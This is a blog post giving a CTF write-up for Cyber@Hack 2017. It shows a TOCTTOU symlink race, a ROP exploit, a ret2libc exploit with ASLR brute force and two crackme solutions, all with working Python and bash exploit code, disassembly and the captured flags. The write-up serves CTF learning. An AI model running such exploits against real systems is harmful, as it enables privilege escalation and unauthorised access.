---
layout: post
title: "[Write-Up] Cyber@Hack"
categories: [write-up]
tags: [pwn, reverse-engineering]
description: Write-Up on the Cyber@Hack CTF.
---

# Surroundings
The [Cyber@Hack](https://www.cyberathack.com/) is a french CTF "on site" who take place in differents french cities. The CTF lasted a whole night from the 22 september to the 23 september. The CTF is made of different categories like pwnable, reverse engineering, web, cryptographie, steganographie and forensic.

I did it with a friend and we finished 14th!

![cyber@hack](/assets/media/cyberathack.png)

Together we've done 6 challenges. We were focused on exploit and reverse engineering challenges. This post will explain you how we've solved the different challenges. Below is the different challenges we solved:

1. [tocttou](/write-up/2017/09/26/cyber@hack.html#1-tocttou) (Exploit)
2. [basicrop](/write-up/2017/09/26/cyber@hack.html#2-basicrop) (Exploit)
3. [alien-language](/write-up/2017/09/26/cyber@hack.html#3-alien-language) (Reverse engineering/Cryptography)
4. [BotoxedString](/write-up/2017/09/26/cyber@hack.html#4-botoxedstring) (Reverse engineering)
5. [Robot cOP](/write-up/2017/09/26/cyber@hack.html#5-robot-cop) (Exploit)

You can find all the binary/exploit present in this post on my [Github](https://github.com/meffre-q/ctf/tree/master/cyber%40hack_2k17).

# 1. Tocttou
This challenge was solved by my friend. It's a tocttou exploitation challenge. Tocttou means Time Of Check To Time Of Use, that bug occurs when a binary open a file, try to access it and if it can, read it contents but forgot to check if the file has changed between the access part and the read part.

So we first begun by checking the binary.
```bash
$ file tocttou
tocttou: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f85ccc503bad6c160864d080481d6d9885d1dd65, not stripped

$ ls -lh tocttou 
-rwsr-sr-x 1 tocttou-solved tocttou 8.3K Sep 21 14:03 tocttou

$ checksec --file tocttou
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	tocttou
```

We faced a basic binary without stripped, PIE or SSP. Then I try to start the binary to check how it works:
```bash
$ ./tocttou
USAGE : ./tocttou <file to read>

$ ./tocttou flag
flag : you dont have enough permissions to read this file.
```

Hum... It would have been so easy! Lets begin the reverse engineering part! After a little look at the asm code, it seems that the important part is in the "can_be_read" function.
```nasm
$ gdb -q ./tocttou 
Reading symbols from ./tocttou...(no debugging symbols found)...done.

gdb-peda$ disas can_be_read 
Dump of assembler code for function can_be_read:
   0x0000000000400770 <+0>:	push   rbp
   0x0000000000400771 <+1>:	mov    rbp,rsp
   0x0000000000400774 <+4>:	sub    rsp,0x10
   0x0000000000400778 <+8>:	mov    QWORD PTR [rbp-0x8],rdi
   0x000000000040077c <+12>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000400781 <+17>:	jne    0x40078a <can_be_read+26>
   0x0000000000400783 <+19>:	mov    eax,0x0
   0x0000000000400788 <+24>:	jmp    0x4007ab <can_be_read+59>
   0x000000000040078a <+26>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040078e <+30>:	mov    esi,0x4
   0x0000000000400793 <+35>:	mov    rdi,rax
   0x0000000000400796 <+38>:	call   0x4005d0 <access@plt>
   0x000000000040079b <+43>:	test   eax,eax
   0x000000000040079d <+45>:	jne    0x4007a6 <can_be_read+54>
   0x000000000040079f <+47>:	mov    eax,0x1
   0x00000000004007a4 <+52>:	jmp    0x4007ab <can_be_read+59>
   0x00000000004007a6 <+54>:	mov    eax,0x0
   0x00000000004007ab <+59>:	leave  
   0x00000000004007ac <+60>:	ret    
End of assembler dump.
```

The function call the access libc function and return 1 if the access has success or 0 if not. Here is the Tocttou bug. As I said previously, if we change the file after access checked success, we will be able to bypass the access function!

To do it, we will begin by create a file in the tmp directory.This file will be used for the first symbolic link. My friend solved the challenge in python but I'm better in Bash so I will show you the Bash method. To solved the challenge, we will need 2 shell. The first one will do an infine look with 4 command. The two first will create a symlink with the previous created file and then deleted this link and the two next command will created a symlink between with the flag file and then deleted this symlink. The second shell will run the binary in an infinite loop with the symlink as argument. The goal is to set the symlink when access check the file and then change that symlink when the file will be read with the flag file. You can see below a little scheme about the attack:![tocttou scheme](/assets/media/tocttou_schema.png)

Now let's try it! Below is the first shell view:
```bash
$ touch /tmp/dagger/foo

$ while true; do ln -s /tmp/dagger/foo /tmp/dagger/toc; unlink /tmp/dagger/toc; ln -s /challenges/tocttou/flag /tmp/dagger/toc; unlink /tmp/dagger/toc; done

```

And now the second shell view:
```bash
$ while true; do ./tocttou/tocttou /tmp/dagger/toc|grep flag ;done
flag{tick_tock_touuuu}
```

Done.

Well played to my friend!

# 2. BasicROP
As it is sayed in the challenge name, this one is a very basic Return Oriented Programming. For thos who don't know what is the ROP technique, I redirect you to one of my precedent [post](/pwn/2017/01/25/easy_method.html).

I first begin by taking a look to the binary, the size, the protection, the type, etc...
```bash
$ file basicrop 
basicrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped

$ ls -lh basicrop 
-rwxr-xr-x 1 meffre_q meffre_q 1.1K Sep 21 17:43 basicrop

$ checksec --file basicrop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		0	basicrop

$ nm basicrop 
00000000004000c1 t breakme
000000000060011c D __bss_start
000000000060011c D _edata
0000000000600120 D _end
00000000004000fa t fuckit
0000000000600114 d shell
00000000004000b0 T _start
```

No special protection, the binary is statically compiled but it seems very small, only 1.1K and after checking the symbol, the binary seems to be developed directly in assembly language because of the little number of symbols.

So I begun the reversing part but it was very fast because of the little size of the binary. The "_start" function call a function name "breakme". This "breakme" function did two syscall, the first one is "read" and the second one is "write". But there is an overflow at the "read" syscall because the binary try to read 280 bytes in a 256 bytes buffer. So we can overwrite RIP register at the 256th byte. A basic ROP should not be easy because of the binary size but I remember of 2 symbols I didn't saw yet in the binary, the function "fuckit" and the data "shell". Below is the disassembled code of fuckit:
```nasm
gdb-peda$ disas fuckit 
Dump of assembler code for function fuckit:
   0x00000000004000fa <+0>:	movabs rdi,0x600114
   0x0000000000400104 <+10>:	push   0x0
   0x0000000000400106 <+12>:	push   rdi
   0x0000000000400107 <+13>:	mov    rsi,rsp
   0x000000000040010a <+16>:	lea    rdx,[rsi+0x8]
   0x000000000040010e <+20>:	pop    rax
   0x000000000040010f <+21>:	pop    rax
   0x0000000000400110 <+22>:	pop    rax
   0x0000000000400111 <+23>:	ret    
End of assembler dump.
```

First, this function move a value in RDI register. It seems to contain the "shell" address we've saw in the "nm" output. Lets display it:
```bash
$ gdb ./basicrop -q
Reading symbols from ./basicrop...(no debugging symbols found)...done.

gdb-peda$ br _start
Breakpoint 1 at 0x4000b0

gdb-peda$ r
...
Breakpoint 1, 0x00000000004000b0 in _start ()

gdb-peda$ x/s 0x600114
0x600114:	"/bin/sh"
```

Nice, thanks to this string, we can easily execute a shell! So the "fuckit" function is very easy. It move the strings "/bin/sh" into the RDI register, then push 0x0 and RDI on the stack, then move RSP into RSI, then load the address of RSI+0x8 (so RSP+0x8) and then pop 3 times a value into RAX. Our goal will be to do an "execve" syscall with the good argument/syscall number. Our register will look like that: 

RAX = 0x3b (59)
RDI = "/bin/sh"
RSI = "/bin/sh"
RDX = 0x0

RDI/RSI/RDX are set to the good value but we have to set RAX. In the "fuckit" function we can see 3 "pop". The first and the second one will pop the RDI value and 0x0, the two value pushed just before. But we can control the last one so we will add the value 0x3b (59) on the stack to poped it in RAX. Then we need to do the syscall. To do it we will jump into one of the two syscall instructions in the "breakme" function. I choose the first one.

The exploit will look like that:
```python
#!/usr/bin/env python

import struct

fuckit_addr=struct.pack("<Q", 0x00000000004000fa)	 # Fuckit function address
execve=struct.pack("<Q", 0x3b)			            # Execve syscall number
syscall_addr=struct.pack("<Q", 0x00000000004000dd)    # Syscall instruction address
padding="A"*256						               # Padding before overflow

print padding+fuckit_addr+execve+syscall_addr
```

And then we test it:
```bash
$ (python /tmp/dagger/basicrop.py;cat)|./basicrop 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@;�@id
uid=1334(dagger) gid=1334(dagger) euid=1308(basic_rop-solved) egid=1307(basic_rop) groups=1307(basic_rop),1002(tocttou),1305(robot_cop),1306(2befree),1311(botoxedstring),1312(fakemalware-killswitch),1334(dagger)
cat flag
flag{r0ppin9_Y0ur_waY_t0_h3aveN}
```

Done.
# 3. Alien-Language
This challenge was in the cryptographic category but, for me, it was mostly a reversing challenge than cryptographic. (Maybe there was an other method to solve it...)

This challenge was made with an elf-64 binary. So we began by examining it:
```bash
$ file alien 
alien: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a87da1012726ca02b0c683891ff6b35620b32e42, not stripped

$ ls -lh alien 
-rwxr-xr-x 1 meffre_q meffre_q 8.4K Sep 21 21:05 alien

$ nm alien 
0000000000201048 B __bss_start
0000000000201048 b completed.6973
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201038 D __data_start
0000000000201038 W data_start
0000000000000670 t deregister_tm_clones
0000000000000700 t __do_global_dtors_aux
0000000000200de8 t __do_global_dtors_aux_fini_array_entry
0000000000201040 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201048 D _edata
0000000000201050 B _end
0000000000000b04 T _fini
0000000000000740 t frame_dummy
0000000000200de0 t __frame_dummy_init_array_entry
0000000000000cec r __FRAME_END__
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
0000000000000ba0 r __GNU_EH_FRAME_HDR
00000000000005d0 T _init
0000000000200de8 t __init_array_end
0000000000200de0 t __init_array_start
0000000000000b10 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000000b00 T __libc_csu_fini
0000000000000a90 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
000000000000091f T main
000000000000074a T my_open
                 U printf@@GLIBC_2.2.5
00000000000006b0 t register_tm_clones
                 U __stack_chk_fail@@GLIBC_2.4
0000000000000640 T _start
                 U strlen@@GLIBC_2.2.5
0000000000201048 D __TMC_END__
                 U write@@GLIBC_2.2.5

$ ./alien 
337778877772337778
Relaunch with the solution in argument.

$ ./alien toto 
Too bad
```

Nothing very interesting, the "strings" command didn't give use much more informations. So let's begin the reverse engineering!

The main function look like that:
```nasm
$ gdb -q ./alien 
Reading symbols from ./alien...(no debugging symbols found)...done.

gdb-peda$ disas main
Dump of assembler code for function main:
0x000000000000091f <+0>:	push   rbp
0x0000000000000920 <+1>:	mov    rbp,rsp
0x0000000000000923 <+4>:	sub    rsp,0x10
0x0000000000000927 <+8>:	mov    DWORD PTR [rbp-0x4],edi
0x000000000000092a <+11>:	mov    QWORD PTR [rbp-0x10],rsi
0x000000000000092e <+15>:	cmp    DWORD PTR [rbp-0x4],0x1
0x0000000000000932 <+19>:	jne    0x960 <main+65>
0x0000000000000934 <+21>:	mov    edx,0x13
0x0000000000000939 <+26>:	lea    rsi,[rip+0x202]        # 0xb42
0x0000000000000940 <+33>:	mov    edi,0x1
0x0000000000000945 <+38>:	call   0x600 <write@plt>
0x000000000000094a <+43>:	mov    edx,0x28
0x000000000000094f <+48>:	lea    rsi,[rip+0x202]        # 0xb58
0x0000000000000956 <+55>:	mov    edi,0x1
0x000000000000095b <+60>:	call   0x600 <write@plt>
0x0000000000000960 <+65>:	cmp    DWORD PTR [rbp-0x4],0x2
0x0000000000000964 <+69>:	jne    0xa6b <main+332>
0x000000000000096a <+75>:	mov    rax,QWORD PTR [rbp-0x10]
0x000000000000096e <+79>:	add    rax,0x8
0x0000000000000972 <+83>:	mov    rax,QWORD PTR [rax]
0x0000000000000975 <+86>:	mov    rdi,rax
0x0000000000000978 <+89>:	call   0x610 <strlen@plt>
0x000000000000097d <+94>:	cmp    rax,0x8
0x0000000000000981 <+98>:	je     0x9a3 <main+132>
0x0000000000000983 <+100>:	mov    edx,0x8
0x0000000000000988 <+105>:	lea    rsi,[rip+0x1f2]        # 0xb81
0x000000000000098f <+112>:	mov    edi,0x1
0x0000000000000994 <+117>:	call   0x600 <write@plt>
0x0000000000000999 <+122>:	mov    eax,0xffffffff
0x000000000000099e <+127>:	jmp    0xa8c <main+365>
0x00000000000009a3 <+132>:	mov    rax,QWORD PTR [rbp-0x10]
0x00000000000009a7 <+136>:	add    rax,0x8
0x00000000000009ab <+140>:	mov    rax,QWORD PTR [rax]
0x00000000000009ae <+143>:	add    rax,0x2
0x00000000000009b2 <+147>:	movzx  eax,BYTE PTR [rax]
0x00000000000009b5 <+150>:	cmp    al,0x65
0x00000000000009b7 <+152>:	jne    0xa4e <main+303>
0x00000000000009bd <+158>:	mov    rax,QWORD PTR [rbp-0x10]
0x00000000000009c1 <+162>:	add    rax,0x8
0x00000000000009c5 <+166>:	mov    rax,QWORD PTR [rax]
0x00000000000009c8 <+169>:	add    rax,0x4
0x00000000000009cc <+173>:	movzx  eax,BYTE PTR [rax]
0x00000000000009cf <+176>:	cmp    al,0x73
0x00000000000009d1 <+178>:	jne    0xa4e <main+303>
0x00000000000009d3 <+180>:	mov    rax,QWORD PTR [rbp-0x10]
0x00000000000009d7 <+184>:	add    rax,0x8
0x00000000000009db <+188>:	mov    rax,QWORD PTR [rax]
0x00000000000009de <+191>:	add    rax,0x1
0x00000000000009e2 <+195>:	movzx  eax,BYTE PTR [rax]
0x00000000000009e5 <+198>:	cmp    al,0x72
0x00000000000009e7 <+200>:	jne    0xa4e <main+303>
0x00000000000009e9 <+202>:	mov    rax,QWORD PTR [rbp-0x10]
0x00000000000009ed <+206>:	add    rax,0x8
0x00000000000009f1 <+210>:	mov    rax,QWORD PTR [rax]
0x00000000000009f4 <+213>:	add    rax,0x6
0x00000000000009f8 <+217>:	movzx  eax,BYTE PTR [rax]
0x00000000000009fb <+220>:	cmp    al,0x72
0x00000000000009fd <+222>:	jne    0xa4e <main+303>
0x00000000000009ff <+224>:	mov    rax,QWORD PTR [rbp-0x10]
0x0000000000000a03 <+228>:	add    rax,0x8
0x0000000000000a07 <+232>:	mov    rax,QWORD PTR [rax]
0x0000000000000a0a <+235>:	movzx  eax,BYTE PTR [rax]
0x0000000000000a0d <+238>:	cmp    al,0x74
0x0000000000000a0f <+240>:	jne    0xa4e <main+303>
0x0000000000000a11 <+242>:	mov    rax,QWORD PTR [rbp-0x10]
0x0000000000000a15 <+246>:	add    rax,0x8
0x0000000000000a19 <+250>:	mov    rax,QWORD PTR [rax]
0x0000000000000a1c <+253>:	add    rax,0x7
0x0000000000000a20 <+257>:	movzx  eax,BYTE PTR [rax]
0x0000000000000a23 <+260>:	cmp    al,0x65
0x0000000000000a25 <+262>:	jne    0xa4e <main+303>
0x0000000000000a27 <+264>:	mov    rax,QWORD PTR [rbp-0x10]
0x0000000000000a2b <+268>:	add    rax,0x8
0x0000000000000a2f <+272>:	mov    rax,QWORD PTR [rax]
0x0000000000000a32 <+275>:	add    rax,0x3
0x0000000000000a36 <+279>:	movzx  eax,BYTE PTR [rax]
0x0000000000000a39 <+282>:	cmp    al,0x61
0x0000000000000a3b <+284>:	jne    0xa4e <main+303>
0x0000000000000a3d <+286>:	mov    eax,0x0
0x0000000000000a42 <+291>:	call   0x74a <my_open>
0x0000000000000a47 <+296>:	mov    eax,0x0
0x0000000000000a4c <+301>:	jmp    0xa8c <main+365>
0x0000000000000a4e <+303>:	mov    edx,0x8
0x0000000000000a53 <+308>:	lea    rsi,[rip+0x127]        # 0xb81
0x0000000000000a5a <+315>:	mov    edi,0x1
0x0000000000000a5f <+320>:	call   0x600 <write@plt>
0x0000000000000a64 <+325>:	mov    eax,0xffffffff
0x0000000000000a69 <+330>:	jmp    0xa8c <main+365>
0x0000000000000a6b <+332>:	cmp    DWORD PTR [rbp-0x4],0x2
0x0000000000000a6f <+336>:	jle    0xa87 <main+360>
0x0000000000000a71 <+338>:	mov    edx,0x12
0x0000000000000a76 <+343>:	lea    rsi,[rip+0x10d]        # 0xb8a
0x0000000000000a7d <+350>:	mov    edi,0x1
0x0000000000000a82 <+355>:	call   0x600 <write@plt>
0x0000000000000a87 <+360>:	mov    eax,0x0
0x0000000000000a8c <+365>:	leave  
0x0000000000000a8d <+366>:	ret    
End of assembler dump.
```

It seems to be a conditional series to success to get the flag. The following conditions are the one to respect to get the flag:

1. The argument must have a lenght of 8 bytes.
2. The third bytes must be equal to 0x65 ('e').
3. The fifth bytes must be equal to 0x73 ('s').
4. The second bytes must be equal to 0x72 ('r').
5. The seventh bytes must be equal to 0x72 ('r').
6. The first bytes must be equal to 0x74 ('t').
7. The eighth bytes must be equal to 0x65 ('e').
8. The fourth bytes must be equal must be equal to 0x61 ('a').

All the condition make the word "treasure". Go to test it:
```bash
$ ./alien treasure                      
Well done ! Validate the chall with : flag{S0_U_R_A_2000_k1dd1E?}
```

You can also easily validate the chall with a jump into the "my_open" function while debugging the binary: (be attention at the PIE protection)
```bash
$ gdb -q ./alien 
Reading symbols from ./alien...(no debugging symbols found)...done.

gdb-peda$ br main
Breakpoint 1 at 0x923

gdb-peda$ r
Starting program: /home/meffre_q/Downloads/alien
...
Breakpoint 1, 0x0000555555554923 in main ()

gdb-peda$ jump my_open 
Continuing at 0x55555555474e.
Well done ! Validate the chall with : flag{S0_U_R_A_2000_k1dd1E?}
[Inferior 1 (process 30296) exited normally]
Warning: not running or target is remote
```

Done.
# 4. BotoxedString
This one was a reverse engineering challenge. It is a basic crackme. Let's begin by checking the binary:
```bash
$ file crackme 
crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f77ab6f416fda31fd9e9496b3712353d3fc1ec0d, not stripped

$ ls -lh crackme 
-rwxr-xr-x 1 meffre_q meffre_q 9.5K Sep 21 21:44 crackme

$ nm crackme 
00000000004007c6 T areYouLegit
0000000000601278 B __bss_start
0000000000601280 b completed.6661
0000000000601268 D __data_start
0000000000601268 W data_start
0000000000400700 t deregister_tm_clones
0000000000400780 t __do_global_dtors_aux
0000000000601008 t __do_global_dtors_aux_fini_array_entry
0000000000601270 D __dso_handle
0000000000601018 d _DYNAMIC
0000000000601278 D _edata
0000000000601288 B _end
                 U exit@@GLIBC_2.2.5
0000000000400b44 T _fini
                 U fprintf@@GLIBC_2.2.5
00000000004007a0 t frame_dummy
0000000000601000 t __frame_dummy_init_array_entry
0000000000400d98 r __FRAME_END__
                 U free@@GLIBC_2.2.5
                 U fwrite@@GLIBC_2.2.5
00000000006011f0 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
00000000004005e0 T _init
0000000000601008 t __init_array_end
0000000000601000 t __init_array_start
0000000000400b50 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000601010 d __JCR_END__
0000000000601010 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000400957 T letsCheckThisPass
0000000000400b40 T __libc_csu_fini
0000000000400ad0 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
00000000004009b3 T main
                 U malloc@@GLIBC_2.2.5
                 U open@@GLIBC_2.2.5
000000000040087f T passwordBeautifyier
                 U printf@@GLIBC_2.2.5
                 U read@@GLIBC_2.2.5
0000000000400740 t register_tm_clones
00000000004006d0 T _start
0000000000601278 B stderr@@GLIBC_2.2.5
                 U strlen@@GLIBC_2.2.5
                 U strncmp@@GLIBC_2.2.5
0000000000601278 D __TMC_END__

$ ./crackme 
Usage: ./crackme Password

$ ./crackme toto
Someone told me u were not allowed to do that
```

We faced a basic crackme, without stripped, dynamically linked and we can see different function name thanks to "nm".

So let's begin the reversing part!

The first interesting part is the call to the "areYouLegit" function with the first program argument, in the "main" function:
```nasm
$ gdb -q ./crackme
Reading symbols from ./crackme...(no debugging symbols found)...done.

gdb-peda$ disas main 
Dump of assembler code for function main:
...
0x00000000004009f2 <+63>:	mov    rax,QWORD PTR [rbp-0x30]
0x00000000004009f6 <+67>:	add    rax,0x8
0x00000000004009fa <+71>:	mov    rax,QWORD PTR [rax]
0x00000000004009fd <+74>:	mov    rdi,rax
0x0000000000400a00 <+77>:	call   0x4007c6 <areYouLegit>
...
```

The function will do 4 test on the program argument:

1. Check if the string size is greater than 7.
2. Check if the string contain at least one '-' character.
3. Check if the string contain at least one '+' character.
4. Check if the string contain at least one '@' character.

If one of this tests failed, the function exit with an error code and the program stop their.

After, the main function will call the function "letsCheckThisPass", let's disassemble it:
```nasm
gdb-peda$ disas letsCheckThisPass
Dump of assembler code for function letsCheckThisPass:
   0x0000000000400957 <+0>:	push   rbp
   0x0000000000400958 <+1>:	mov    rbp,rsp
   0x000000000040095b <+4>:	sub    rsp,0x20
   0x000000000040095f <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000400963 <+12>:	mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400967 <+16>:	mov    rdi,rax
   0x000000000040096a <+19>:	call   0x40087f <passwordBeautifyier>
   0x000000000040096f <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400973 <+28>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400977 <+32>:	mov    edx,0xa
   0x000000000040097c <+37>:	mov    esi,0x400b58
   0x0000000000400981 <+42>:	mov    rdi,rax
   0x0000000000400984 <+45>:	call   0x400620 <strncmp@plt>
   0x0000000000400989 <+50>:	test   eax,eax
   0x000000000040098b <+52>:	jne    0x4009a0 <letsCheckThisPass+73>
   0x000000000040098d <+54>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400991 <+58>:	mov    rdi,rax
   0x0000000000400994 <+61>:	call   0x400610 <free@plt>
   0x0000000000400999 <+66>:	mov    eax,0x1
   0x000000000040099e <+71>:	jmp    0x4009b1 <letsCheckThisPass+90>
   0x00000000004009a0 <+73>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009a4 <+77>:	mov    rdi,rax
   0x00000000004009a7 <+80>:	call   0x400610 <free@plt>
   0x00000000004009ac <+85>:	mov    eax,0x0
   0x00000000004009b1 <+90>:	leave  
   0x00000000004009b2 <+91>:	ret    
End of assembler dump.
```

The function is very simple. First it call the function "passwordBeautifyier" at line +19 with the tested password as parameter and then it compare the return value of "passwordBeautifyier" with the goal password. The compared password is "cyber@hack" but the problem is the "passwordBeautifyier" function because it mix the current password so we can't just enter "cyber@hack" as program parameter.

To solve the problem, I choose the lazy solution, instead of disassemble the "passwordBeautifyier" function I test different value and checked my result. After different test, I get the value "-ccyyybberr@@hhaacckk+" which seems to match with the goal password. Let's try it:
```bash
$ ./crackme -ccyyybberr@@hhaacckk+
Good one ! You can validate the chall with : flag{W3lC0M3_t0_CYb3R@H4Ck}
```

Done.
# 5. Robot cOP
This one was an exploit challenge. Let's check the binary:
```bash
$ file Robot_cOP 
Robot_cOP: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5da4c256b34d973d0ff80aff762a9d443c9aadb9, not stripped

$ ls -lh Robot_cOP 
-rwxr-xr-x 1 meffre_q meffre_q 5.4K Sep 21 22:40 Robot_cOP

$ checksec --file Robot_cOP 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		2	Robot_cOP


$ ./Robot_cOP 
Only Inspector Gadget, can use Robot cOP

$ ./Robot_cOP toto


$ nm Robot_cOP
...
         U system@@GLIBC_2.0
...
```

So the binary seems to be basic. It is a 32 bits elf dinamycally compiled and we can see thanks to "nm" the system LibC function so maybee the program use it somewhere. Let's disassemble it!

After checking the "main" function, the most important things is the call to "my_bad" function. You can see below the disassembled code:
```nasm
gdb-peda$ disas my_bad 
Dump of assembler code for function my_bad:
   0x08048483 <+0>:	push   ebp
   0x08048484 <+1>:	mov    ebp,esp
   0x08048486 <+3>:	sub    esp,0x808
   0x0804848c <+9>:	sub    esp,0x8
   0x0804848f <+12>:	push   DWORD PTR [ebp+0x8]
   0x08048492 <+15>:	lea    eax,[ebp-0x808]
   0x08048498 <+21>:	push   eax
   0x08048499 <+22>:	call   0x8048310 <strcpy@plt>
   0x0804849e <+27>:	add    esp,0x10
   0x080484a1 <+30>:	leave  
   0x080484a2 <+31>:	ret    
End of assembler dump.
```

The function is very easy. First it allocate 0x808 (2056) bytes on the stack, then push the first argument which is the first program argument, then load the address of the allocated buffer, push that buffer and then copy the first program argument into the buffer. So if we give to strcpy a buffer greater than 0x808 bytes we will overflow the return adress.

Instead of using the ROP technic to solve the challenge, I choose a very fast one which I described in a [previous post](/pwn/2017/05/14/aslr_bruteforce.html), the ASLR bruteforce! As I already explained it in details in my previous post, I will only show you the final exploit:
```python
#!/usr/bin/env python
# coding: utf-8

import struct
import subprocess

base = 0xf754e000                  # base libc address's
system_offset = 0x0003e3e0         # system offset function
exit_offset = 0x000311b0           # exit offset function
binsh =  0x804825c                 # /bin/sh  addresse's contained in the binary

system_addr = base + system_offset # final system address's
exit_addr = base + exit_offset     # final exit address's

payload = "A" * 2060
payload += struct.pack("<I",system_addr)
payload += struct.pack("<I",exit_addr)
payload += struct.pack("<I",binsh)

while (1):
    result = subprocess.call(["/challenges/robot_cop/Robot_cOP", payload])
    if not result:
        print "Done"
        exit(0)
    else:
        print "KO\n"
```

And we test:
```bash
$ python /tmp/brute.py
KO

KO

KO
...

$ id
uid=1334(dagger) gid=1334(dagger) euid=1310(robot_cop-solved) egid=1305(robot_cop) groups=1305(robot_cop),1002(tocttou),1306(2befree),1307(basic_rop),1311(botoxedstring),1312(fakemalware-killswitch),1334(dagger)
$ cat flag
flag{0r5t7hvR4dfTyhj67yKLO}
```

Done.
